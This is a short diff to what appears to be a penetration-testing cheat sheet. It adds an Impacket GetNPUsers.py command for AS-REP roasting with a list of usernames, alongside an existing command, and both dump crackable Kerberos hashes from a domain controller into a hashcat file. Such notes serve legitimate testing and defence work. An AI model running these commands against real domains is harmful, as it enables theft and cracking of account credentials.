@@ -3,3 +3,9 @@
 ```bash
 GetNPUsers.py domain.local/user:password -dc-ip x.x.x.x -outputfile asrep.hashcat
 ```
+
+With a list of known users:
+
+```bash
+GetNPUsers.py -usersfile users.txt -dc-ip x.x.x.x domain.local/ -outputfile asrep.hashcat
+```
